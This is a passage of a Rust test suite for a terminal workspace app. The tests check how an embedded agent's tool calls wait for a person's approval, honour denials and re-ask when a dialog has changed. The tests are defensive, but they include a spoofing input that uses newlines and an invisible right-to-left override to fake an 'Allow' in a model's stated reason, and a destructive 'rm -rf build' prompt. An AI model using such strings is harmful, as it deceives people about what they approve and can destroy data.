    let before = blocks(&ws, cx);
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "open_agent",
        json!({"agent": "nope", "workspace": shown}),
    );
    assert!(failed && text.contains("There's no agent nope"), "{text}");
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "open_agent",
        json!({"agent": "claude", "workspace": shown, "effort": "ultra"}),
    );
    assert!(failed && text.contains("effort"), "{text}");
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "open_agent",
        json!({"agent": "claude", "workspace": shown, "connect": ["nope1"]}),
    );
    assert!(failed && text.contains("nope1"), "{text}");
    assert_eq!(blocks(&ws, cx), before);
}

/// Calls `tool` as the engine does, on connection `conn` (its request's id is `conn` too): the
/// channel its answer comes on, now or once the person answers.
pub(super) fn control_later(
    handle: AnyWindowHandle,
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
    conn: u64,
    tool: &str,
    arguments: Value,
) -> std::sync::mpsc::Receiver<String> {
    let secret = ws.read_with(cx, |ws, _| ws.templum_agent.secret.clone());
    let (reply, answers) = std::sync::mpsc::channel();
    let message = Message {
        hello: Hello {
            terminal: String::new(),
            client: "control".into(),
            control: Some(secret),
        },
        conn,
        incoming: Incoming::Request {
            id: json!(conn),
            method: "tools/call".into(),
            params: json!({ "name": tool, "arguments": arguments }),
        },
        reply,
    };
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.serve(message, window, cx))
    })
    .unwrap();
    answers
}

/// A notification on the control connection `conn`, as the engine or the bus sends it.
fn control_note(
    handle: AnyWindowHandle,
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
    conn: u64,
    method: &str,
    params: Value,
) {
    let secret = ws.read_with(cx, |ws, _| ws.templum_agent.secret.clone());
    let (reply, _) = std::sync::mpsc::channel();
    let message = Message {
        hello: Hello {
            terminal: String::new(),
            client: "control".into(),
            control: Some(secret),
        },
        conn,
        incoming: Incoming::Notification {
            method: method.into(),
            params,
        },
        reply,
    };
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.serve(message, window, cx))
    })
    .unwrap();
}

fn answer(
    handle: AnyWindowHandle,
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
    answer: crate::chat::Answer,
) {
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| {
            let id = ws.templum_agent.approvals[0].id;
            ws.answer_approval(id, answer, window, cx)
        })
    })
    .unwrap();
    cx.run_until_parked();
}

/// A new terminal in the shown workspace where Claude Code runs, as a snapshot would have found
/// it: closing it loses work. Its block and its id.
fn busy_terminal(
    handle: AnyWindowHandle,
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
) -> (BlockId, String) {
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| {
            ws.new_terminal(window, cx);
            let id = ws.space.canvas.top().unwrap();
            ws.space.terminal_mut(id).unwrap().seen.agent = Some("claude".into());
            (id, ws.space.uids[&id].clone())
        })
    })
    .unwrap()
}

#[gpui_kit::test]
fn an_idle_shell_closes_at_once_a_running_program_waits(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let idle = first_id(&ws, cx);
    let idle_uid = ws.read_with(cx, |ws, _| ws.space.uids[&idle].clone());
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let (failed, text) = control(handle, &ws, cx, "close_block", json!({"block": idle_uid}));
    assert_eq!(
        (failed, text),
        (
            false,
            format!("Closed {idle_uid}. The person can bring it back with Ctrl+Z.")
        )
    );
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "close_block",
        json!({"block": uid, "reason": "done"}),
    );
    assert!(answers.try_recv().is_err(), "it waits for the person");
    ws.read_with(cx, |ws, _| {
        let approvals = &ws.templum_agent.approvals;
        assert_eq!(approvals.len(), 1);
        assert_eq!(approvals[0].said, "Close \"Claude Code\"");
        assert_eq!(approvals[0].details, "Claude Code is running in it.");
        assert!(ws.space.canvas.get(busy).is_some());
        assert!(ws.templum_agent.unread);
    });
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(
        !failed && text.starts_with(&format!("Closed {uid}.")),
        "{text}"
    );
    ws.read_with(cx, |ws, _| {
        assert!(ws.space.canvas.get(busy).is_none());
        assert!(ws.templum_agent.approvals.is_empty());
        assert!(
            ws.templum_agent
                .conversation
                .rows
                .contains(&::templum_agent::Row::Approval {
                    said: "Close \"Claude Code\"".into(),
                    answer: "Allowed once".into(),
                })
        );
    });
}

#[gpui_kit::test]
fn deny_answers_the_refusal_with_the_persons_words(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    answer(
        handle,
        &ws,
        cx,
        crate::chat::Answer::Deny(Some("leave it".into())),
    );
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(failed);
    assert_eq!(
        text,
        "The person denied this. Don't try it another way: ask them what they want.\nThey said: leave it"
    );
    ws.read_with(cx, |ws, _| {
        assert!(ws.space.canvas.get(busy).is_some());
        assert!(
            ws.templum_agent
                .conversation
                .rows
                .contains(&::templum_agent::Row::Approval {
                    said: "Close \"Claude Code\"".into(),
                    answer: "Denied".into(),
                })
        );
    });
    let answers = control_later(handle, &ws, cx, 8, "close_block", json!({"block": uid}));
    answer(handle, &ws, cx, crate::chat::Answer::Deny(None));
    let (_, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert_eq!(
        text,
        "The person denied this. Don't try it another way: ask them what they want."
    );
}

#[gpui_kit::test]
fn a_grant_lets_the_tool_through(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let first = first_id(&ws, cx);
    let uid = ws.read_with(cx, |ws, _| ws.space.uids[&first].clone());
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_to_terminal",
        json!({"block": uid, "text": "ls"}),
    );
    assert!(answers.try_recv().is_err(), "it waits");
    assert_eq!(
        ws.read_with(cx, |ws, _| ws.templum_agent.approvals[0].details.clone()),
        "ls"
    );
    answer(handle, &ws, cx, crate::chat::Answer::Conversation);
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert_eq!(
        (failed, text.as_str()),
        (false, format!("Typed into {uid}.").as_str())
    );
    let (failed, text) = control(
        handle,
        &ws,
        cx,
        "send_to_terminal",
        json!({"block": uid, "text": "pwd"}),
    );
    assert!(!failed, "the grant lets it through: {text}");
    ws.read_with(cx, |ws, _| {
        assert!(ws.templum_agent.grants.contains("send_to_terminal"));
        assert!(ws.templum_agent.approvals.is_empty());
    });
}

/// The Templum Agent's text, typed into an agent that went quiet on the task it handed it,
/// answers its dialog as `send_keys` does: the agent waits for the task again
/// (docs/specs/agent-protocol.md, 5).
#[gpui_kit::test]
fn its_typed_text_starts_a_quiet_agents_wait_over(cx: &mut TestAppContext) {
    use crate::workspace::{AgentState, Handed};
    let (handle, ws) = open(cx);
    let first = first_id(&ws, cx);
    let uid = ws.read_with(cx, |ws, _| ws.space.uids[&first].clone());
    let quiet = |ws: &Entity<Workspace>, cx: &mut TestAppContext| {
        ws.read_with(cx, |ws, _| {
            ws.space
                .terminal(first)
                .unwrap()
                .handed
                .as_ref()
                .map(|h| h.quiet)
        })
    };
    ws.update(cx, |ws, _| {
        ws.templum_agent.grants.insert("send_to_terminal".into());
        let pane = ws.space.terminal_mut(first).unwrap();
        pane.state = Some(AgentState::Idle);
        pane.handed = Some(Handed {
            quiet: true,
            ..Handed::new(::templum_agent::ASKER, std::time::Duration::from_secs(600))
        });
    });
    let typed = json!({"block": uid, "text": "y"});
    let (failed, text) = control(handle, &ws, cx, "send_to_terminal", typed);
    assert!(!failed, "{text}");
    assert_eq!(quiet(&ws, cx), Some(false));
    let state = ws.read_with(cx, |ws, _| ws.space.terminal(first).unwrap().state.clone());
    assert_eq!(state, Some(AgentState::Working));
}

#[gpui_kit::test]
fn its_own_running_agent_closes_without_asking(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    ws.update(cx, |ws, _| {
        ws.templum_agent.conversation.own.blocks.push(uid.clone())
    });
    let (failed, text) = control(handle, &ws, cx, "close_block", json!({"block": uid}));
    assert!(!failed, "{text}");
    assert!(ws.read_with(cx, |ws, _| ws.space.canvas.get(busy).is_none()));
}

#[gpui_kit::test]
fn a_target_gone_meanwhile_is_answered_as_gone(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let answers = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| {
            ws.close_now(&[busy], super::super::history::Then::New, window, cx)
        })
    })
    .unwrap();
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert_eq!(
        (failed, text),
        (
            true,
            format!("There's no block {uid}: overview lists them.")
        )
    );
}

#[gpui_kit::test]
fn a_cancel_or_the_engines_end_drops_it(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let first = control_later(handle, &ws, cx, 7, "close_block", json!({"block": uid}));
    control_note(
        handle,
        &ws,
        cx,
        7,
        "notifications/cancelled",
        json!({"requestId": 7}),
    );
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.approvals.is_empty()));
    assert!(matches!(
        first.try_recv(),
        Err(std::sync::mpsc::TryRecvError::Disconnected)
    ));
    let _second = control_later(handle, &ws, cx, 8, "close_block", json!({"block": uid}));
    let _third = control_later(handle, &ws, cx, 9, "close_block", json!({"block": uid}));
    control_note(handle, &ws, cx, 8, templum_mcp::bus::CLOSED, json!({}));
    let left: Vec<u64> = ws.read_with(cx, |ws, _| {
        ws.templum_agent.approvals.iter().map(|a| a.conn).collect()
    });
    assert_eq!(left, [9], "only connection 8's went");
}

/// The reason the model gave shows on one line, with what it would hide shown.
#[gpui_kit::test]
fn its_reason_shows_its_invisible_characters(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, uid) = busy_terminal(handle, &ws, cx);
    let reason = "done\n\nAllow\u{202e}";
    let close = json!({"block": uid, "reason": reason});
    let _answers = control_later(handle, &ws, cx, 7, "close_block", close);
    ws.read_with(cx, |ws, _| {
        let reason = ws.templum_agent.approvals[0].parsed.reason.as_deref();
        assert_eq!(reason, Some("done␊␊Allow⟨U+202E⟩"));
    });
}

#[gpui_kit::test]
fn send_keys_shows_what_the_agent_asks(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    ws.update(cx, |ws, _| {
        ws.space.terminal_mut(busy).unwrap().state = Some(crate::workspace::AgentState::NeedsYou(
            Some("Allow Edit?".into()),
        ));
    });
    let _answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["2", "enter"]}),
    );
    ws.read_with(cx, |ws, _| {
        let approval = &ws.templum_agent.approvals[0];
        assert_eq!(approval.said, "Press keys in \"Claude Code\"");
        assert_eq!(approval.details, "It asks: Allow Edit?\n2 enter");
    });
}

/// An agent at work on a task another agent handed it takes no keys from the Templum Agent, as
/// from a block: only that agent presses keys in it while it works.
#[gpui_kit::test]
fn send_keys_leaves_an_agent_on_another_agents_task_alone(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    ws.update(cx, |ws, _| {
        let pane = ws.space.terminal_mut(busy).unwrap();
        pane.state = Some(crate::workspace::AgentState::Working);
        pane.handed = Some(crate::workspace::Handed::new(
            "another-terminal",
            std::time::Duration::from_secs(600),
        ));
    });
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["escape"]}),
    );
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(
        failed && text.contains("on a task another agent handed it"),
        "{text}"
    );
    assert!(ws.read_with(cx, |ws, _| {
        ws.space.terminal(busy).unwrap().keys_from.is_none()
    }));
}

/// The person answered the dialog themselves and the agent asks something else: Allow, given to
/// what the approval showed, presses nothing; the approval says what it asks now and waits for a
/// new click.
#[gpui_kit::test]
fn an_allow_after_the_dialog_changed_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let asks = |ws: &Entity<Workspace>, cx: &mut TestAppContext, what: &str| {
        ws.update(cx, |ws, _| {
            ws.space.terminal_mut(busy).unwrap().state =
                Some(crate::workspace::AgentState::NeedsYou(Some(what.into())));
        })
    };
    asks(&ws, cx, "Allow Bash(ls)?");
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["1"]}),
    );
    let long_ago = cx.executor().now() - std::time::Duration::from_secs(60);
    ws.read_with(cx, |ws, _| {
        let approval = &ws.templum_agent.approvals[0];
        approval.read.set(true);
        approval.shown.set(Some(long_ago));
    });
    asks(&ws, cx, "Allow Bash(rm -rf build)?");
    answer(handle, &ws, cx, crate::chat::Answer::Conversation);
    assert!(answers.try_recv().is_err(), "it still waits");
    ws.read_with(cx, |ws, _| {
        assert!(
            ws.space.terminal(busy).unwrap().keys_from.is_none(),
            "no key"
        );
        let agent = &ws.templum_agent;
        assert!(agent.grants.is_empty());
        let approval = &agent.approvals[0];
        assert_eq!(approval.details, "It asks: Allow Bash(rm -rf build)?\n1");
        assert_ne!(approval.shown.get(), Some(long_ago), "shown anew");
        assert!(approval.changed);
        assert!(
            !agent
                .conversation
                .rows
                .iter()
                .any(|r| matches!(r, ::templum_agent::Row::Approval { .. }))
        );
    });
    // Its words may read the same: it says why it asks again.
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        assert!(window.try_find("approval-changed").is_some());
    })
    .unwrap();
    // Unchanged since, the next Allow presses it.
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(!failed && text.starts_with("Pressed 1 key"), "{text}");
}

/// Claude Code asks "Allow Bash?" for every command: the person answers the dialog the approval
/// showed, their agent opens another in the same words, and Allow presses nothing on it.
#[gpui_kit::test]
fn an_allow_after_another_dialog_in_the_same_words_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let terminal = ws.read_with(cx, |ws, _| {
        ws.space.terminal(busy).unwrap().term.id().to_string()
    });
    let asks = json!({ "event": "needs_you", "message": "Allow Bash?" });
    super::bus::event(handle, &ws, cx, &terminal, asks.clone());
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["1"]}),
    );
    super::bus::event(handle, &ws, cx, &terminal, json!({ "event": "working" }));
    super::bus::event(handle, &ws, cx, &terminal, asks);
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    assert!(answers.try_recv().is_err(), "it still waits");
    ws.read_with(cx, |ws, _| {
        assert!(ws.space.terminal(busy).unwrap().keys_from.is_none());
        assert!(ws.templum_agent.approvals[0].changed);
    });
}

/// Claude Code's subagents ask for their commands at once: a dialog asked while one shows waits
/// behind it, with no hook of its own. The person answers the one the approval showed, the next
/// shows in the same words, and Allow presses nothing on it.
#[gpui_kit::test]
fn an_allow_after_a_dialog_queued_behind_it_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let terminal = ws.read_with(cx, |ws, _| {
        ws.space.terminal(busy).unwrap().term.id().to_string()
    });
    let asks = json!({ "event": "needs_you", "message": "Allow Bash?" });
    super::bus::event(handle, &ws, cx, &terminal, asks.clone());
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["1"]}),
    );
    super::bus::event(handle, &ws, cx, &terminal, asks);
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    assert!(answers.try_recv().is_err(), "it still waits");
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.approvals[0].changed));
}

/// Two dialogs were asked before the approval: the person answers the first one themselves, in
/// their terminal, and the second shows with no hook. Allow presses nothing on it.
#[gpui_kit::test]
fn an_allow_after_the_person_typed_in_it_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let terminal = ws.read_with(cx, |ws, _| {
        ws.space.terminal(busy).unwrap().term.id().to_string()
    });
    let asks = json!({ "event": "needs_you", "message": "Allow Bash?" });
    super::bus::event(handle, &ws, cx, &terminal, asks.clone());
    super::bus::event(handle, &ws, cx, &terminal, asks);
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["1"]}),
    );
    ws.read_with(cx, |ws, _| {
        let pane = ws.space.terminal(busy).unwrap();
        pane.person_typed();
        pane.term.text("1");
    });
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    assert!(answers.try_recv().is_err(), "it still waits");
    ws.read_with(cx, |ws, _| {
        assert!(ws.space.terminal(busy).unwrap().keys_from.is_none());
        assert!(ws.templum_agent.approvals[0].changed);
    });
}

/// The same with the person's mouse: a program that asked for it (a TUI, Claude Code full screen)
/// hears the wheel, which may answer its dialog.
#[cfg(unix)]
#[gpui_kit::test]
fn an_allow_after_the_persons_mouse_reached_it_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let id = first_id(&ws, cx);
    super::terminals::program_asks("\x1b[?1002h\x1b[?1006h", handle, &ws, cx, |m| m.mouse);
    let (uid, terminal) = ws.update(cx, |ws, _| {
        let pane = ws.space.terminal_mut(id).unwrap();
        pane.seen.agent = Some("claude".into());
        let terminal = pane.term.id().to_string();
        (ws.space.uids[&id].clone(), terminal)
    });
    let asks = json!({ "event": "needs_you", "message": "Allow Bash?" });
    super::bus::event(handle, &ws, cx, &terminal, asks.clone());
    super::bus::event(handle, &ws, cx, &terminal, asks);
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["1"]}),
    );
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        let body = window.find(("body", id.0 as usize)).bounds().origin;
        let at = (f32::from(body.x) + 20., f32::from(body.y) + 20.);
        wheel(window, cx, at, ScrollDelta::Lines(point(0., 1.)), false);
    })
    .unwrap();
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    assert!(answers.try_recv().is_err(), "it still waits");
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.approvals[0].changed));
}

/// A full-screen program that didn't ask for the mouse (Codex) gets the wheel as ↑/↓: scrolling
/// it to read the command moves its dialog's choice, and Allow presses nothing on it.
#[cfg(unix)]
#[gpui_kit::test]
fn an_allow_after_the_wheel_moved_a_full_screen_program_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let id = first_id(&ws, cx);
    super::terminals::program_asks("\x1b[?1049h", handle, &ws, cx, |m| m.full_screen);
    let uid = ws.update(cx, |ws, _| {
        let pane = ws.space.terminal_mut(id).unwrap();
        assert!(!pane.term.shared().modes().mouse);
        pane.seen.agent = Some("codex".into());
        ws.space.uids[&id].clone()
    });
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["enter"]}),
    );
    cx.update_window(handle, |_, window, cx| {
        window.render_frame(cx);
        let body = window.find(("body", id.0 as usize)).bounds().origin;
        let at = (f32::from(body.x) + 20., f32::from(body.y) + 20.);
        wheel(window, cx, at, ScrollDelta::Lines(point(0., -1.)), false);
    })
    .unwrap();
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    assert!(answers.try_recv().is_err(), "it still waits");
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.approvals[0].changed));
}

/// Another agent wired to it types or presses keys in it while the approval waits: Allow presses
/// nothing. Nothing else reached it since, the next Allow presses its keys.
#[gpui_kit::test]
fn an_allow_after_another_agent_typed_in_it_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let mine = first_id(&ws, cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let terminal = ws.update(cx, |ws, cx| {
        assert!(ws.connect(mine, busy, cx));
        ws.space.terminal(mine).unwrap().term.id().to_string()
    });
    let typing = [
        (
            "send_to_terminal",
            json!({"block": uid, "text": "2", "enter": true}),
        ),
        ("send_keys", json!({"block": uid, "keys": ["down"]})),
    ];
    for (conn, (tool, args)) in (7..).zip(typing) {
        let answers = control_later(
            handle,
            &ws,
            cx,
            conn,
            "send_keys",
            json!({"block": uid, "keys": ["1"]}),
        );
        let _typed = super::bus::call_later(handle, &ws, cx, &terminal, 1, tool, args);
        super::bus::after(cx, 1_000);
        answer(handle, &ws, cx, crate::chat::Answer::Once);
        assert!(answers.try_recv().is_err(), "{tool}: it still waits");
        assert!(ws.read_with(cx, |ws, _| ws.templum_agent.approvals[0].changed));
        answer(handle, &ws, cx, crate::chat::Answer::Once);
        super::bus::after(cx, 1_000);
        let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
        assert!(
            !failed && text.starts_with("Pressed 1 key"),
            "{tool}: {text}"
        );
    }
}

/// The person sends a note's text to it with "Send to ▸" while the approval waits: Allow presses
/// nothing; and a task's second Enter won't send their line.
#[gpui_kit::test]
fn an_allow_after_the_person_sent_text_to_it_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["enter"]}),
    );
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.send_to(busy, "yes", window, cx))
    })
    .unwrap();
    assert!(ws.read_with(cx, |ws, _| {
        ws.space.terminal(busy).unwrap().keyed.get().is_some()
    }));
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    assert!(answers.try_recv().is_err(), "it still waits");
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.approvals[0].changed));
}

/// A wire types nothing: the person typing in one of its terminals while its approval waits
/// doesn't ask it again.
#[gpui_kit::test]
fn a_wire_isnt_asked_again_when_the_person_typed_in_it(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (_, a) = busy_terminal(handle, &ws, cx);
    let (b, b_uid) = busy_terminal(handle, &ws, cx);
    let waiting = control_later(handle, &ws, cx, 7, "connect", json!({"a": a, "b": b_uid}));
    ws.read_with(cx, |ws, _| {
        let pane = ws.space.terminal(b).unwrap();
        pane.person_typed();
        pane.term.text("ls");
    });
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    let (failed, text) = super::bus::result_of(&waiting.try_recv().expect("wired"));
    assert!(!failed, "{text}");
    assert_eq!(ws.read_with(cx, |ws, _| ws.space.wires.len()), 1);
}

/// A block closed and brought back with Ctrl+Z keeps its id, with another terminal in it: an Allow
/// given to the one the person saw presses nothing in the other, also when it asks the same.
#[gpui_kit::test]
fn an_allow_after_its_block_came_back_asks_again(cx: &mut TestAppContext) {
    let (handle, ws) = open(cx);
    let (busy, uid) = busy_terminal(handle, &ws, cx);
    let asks = |ws: &Entity<Workspace>, cx: &mut TestAppContext| {
        let terminal = ws.read_with(cx, |ws, _| {
            let id = ws.space.block_by_uid(&uid).unwrap();
            ws.space.terminal(id).unwrap().term.id().to_string()
        });
        let asks = json!({ "event": "needs_you", "message": "Allow Bash?" });
        super::bus::event(handle, ws, cx, &terminal, asks);
    };
    asks(&ws, cx);
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_keys",
        json!({"block": uid, "keys": ["1"]}),
    );
    let before = ws.read_with(cx, |ws, _| {
        ws.space.terminal(busy).unwrap().term.id().to_string()
    });
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| {
            ws.close_now(&[busy], crate::workspace::history::Then::New, window, cx);
            ws.undo_canvas(false, window, cx);
            let back = ws.space.block_by_uid(&uid).unwrap();
            let pane = ws.space.terminal_mut(back).unwrap();
            assert_ne!(pane.term.id(), before, "another terminal");
            pane.seen.agent = Some("claude".into());
        })
    })
    .unwrap();
    asks(&ws, cx);
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    assert!(answers.try_recv().is_err(), "it still waits");
    assert!(ws.read_with(cx, |ws, _| ws.templum_agent.approvals[0].changed));
}

/// A program animates its title while it works (Claude Code's spinner): an Allow on a terminal
/// whose agent Templum didn't find (over ssh, or before a snapshot) isn't asked again for it.
#[cfg(unix)]
#[gpui_kit::test]
fn a_title_that_changes_asks_nothing_again(cx: &mut TestAppContext) {
    // It changes its title by itself: input reaching it would ask again.
    let dir = tempfile::tempdir().unwrap();
    let go = dir.path().join("go");
    let script = format!(
        r"printf '\033]2;one\007'; until [ -e '{}' ]; do sleep 0.05; done; printf '\033]2;two\007'; exec cat",
        go.display()
    );
    let command = ("sh".to_string(), vec!["-c".to_string(), script]);
    let (handle, ws) = open_as(cx, Some(command), None, None);
    let first = first_id(&ws, cx);
    let title = |ws: &Entity<Workspace>, cx: &mut TestAppContext, want: &str| {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        while ws.read_with(cx, |ws, _| ws.space.terminal(first).unwrap().term.title()) != want {
            assert!(std::time::Instant::now() < deadline, "no title {want}");
            std::thread::sleep(std::time::Duration::from_millis(50));
        }
    };
    title(&ws, cx, "one");
    let uid = ws.read_with(cx, |ws, _| ws.space.uids[&first].clone());
    let answers = control_later(
        handle,
        &ws,
        cx,
        7,
        "send_to_terminal",
        json!({"block": uid, "text": "hi"}),
    );
    std::fs::write(&go, "").unwrap();
    title(&ws, cx, "two");
    answer(handle, &ws, cx, crate::chat::Answer::Once);
    super::bus::after(cx, 1_000);
    let (failed, text) = super::bus::result_of(&answers.try_recv().unwrap());
    assert!(!failed, "{text}");
}

#[test]
#[ignore = "the fake engine the Templum Agent's tests start"]
fn fake_engine() {
    if let Ok(script) = std::env::var(::templum_agent::fake::VAR) {
        let script = ::templum_agent::fake::this_start(std::path::Path::new(&script));
        ::templum_agent::fake::run(&script, std::io::stdin().lock(), std::io::stdout().lock());
    }
}

/// Claude Code's recorded text turn (Task 1's fixture).
const TEXT_TURN: &str = include_str!("../../../../templum-agent/tests/fixtures/claude-text.jsonl");

/// A workspace on the data folder `dir` whose Templum Agent runs the fake engine on `turns`.
fn with_fake_engine(
    cx: &mut TestAppContext,
    dir: &std::path::Path,
    turns: &[&str],
) -> (AnyWindowHandle, Entity<Workspace>) {
    let (handle, ws) = open_in(cx, None, Some(dir.to_path_buf()));
    let script = dir.join("turns.jsonl");
    std::fs::write(&script, turns.join("---\n")).unwrap();
    let launch =
        ::templum_agent::fake::launch("workspace::tests::templum_agent::fake_engine", &script, dir);
    ws.update(cx, |ws, _| ws.templum_agent.launch = Some(launch));
    (handle, ws)
}

fn send(handle: AnyWindowHandle, ws: &Entity<Workspace>, cx: &mut TestAppContext, text: &str) {
    cx.update_window(handle, |_, window, cx| {
        ws.update(cx, |ws, cx| ws.send_to_agent(text.into(), window, cx))
    })
    .unwrap();
}

/// Waits, in real time, until the conversation's rows satisfy `done`: the engine's lines come
/// from a process.
#[track_caller]
fn rows_until(
    ws: &Entity<Workspace>,
    cx: &mut TestAppContext,
    done: impl Fn(&[::templum_agent::Row]) -> bool,
) -> Vec<::templum_agent::Row> {
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(20);
    loop {
        cx.run_until_parked();
        let rows = ws.read_with(cx, |ws, _| ws.templum_agent.conversation.rows.clone());
        if done(&rows) {
            return rows;
        }
        assert!(std::time::Instant::now() < deadline, "{rows:#?}");
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
}

fn ended(rows: &[::templum_agent::Row]) -> bool {
    rows.iter()
        .any(|r| matches!(r, ::templum_agent::Row::End { .. }))
}

#[gpui_kit::test]
fn a_message_starts_the_engine_and_its_turn_shows(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    let (handle, ws) = with_fake_engine(cx, dir.path(), &[TEXT_TURN]);
    send(handle, &ws, cx, "hi");
    let rows = rows_until(&ws, cx, ended);
    use ::templum_agent::Row;
    assert!(
        matches!(&rows[..], [Row::Person { text, queued: false }, Row::Text { text: said }, Row::End { cost_usd: Some(_), .. }]
            if text == "hi" && said == "Hello there, nice meeting you!"),
        "{rows:#?}"
    );
    let saved =
        std::fs::read_to_string(dir.path().join("agent").join("conversation.json")).unwrap();
    assert!(saved.contains("Hello there, nice meeting you!"), "{saved}");
    ws.read_with(cx, |ws, _| {
        let agent = &ws.templum_agent;
        assert_eq!(
            agent.conversation.session.as_deref(),
            Some("d6441644-97b6-457b-a90e-ad9cf0b00e34")
        );
        let words = &agent.launched[0];
        assert!(
            words.windows(2).any(|w| w[0] == "--session-id"),
            "{words:?}"
        );
        assert!(dir.path().join("agent").join("mcp.json").exists());
    });
}

#[gpui_kit::test]
fn a_session_claude_code_deleted_gives_way_to_a_new_one(cx: &mut TestAppContext) {
    let dir = tempfile::tempdir().unwrap();
    // Claude Code 2.1.286 on `--resume` of a session it deleted: no init, this result, exit 1.
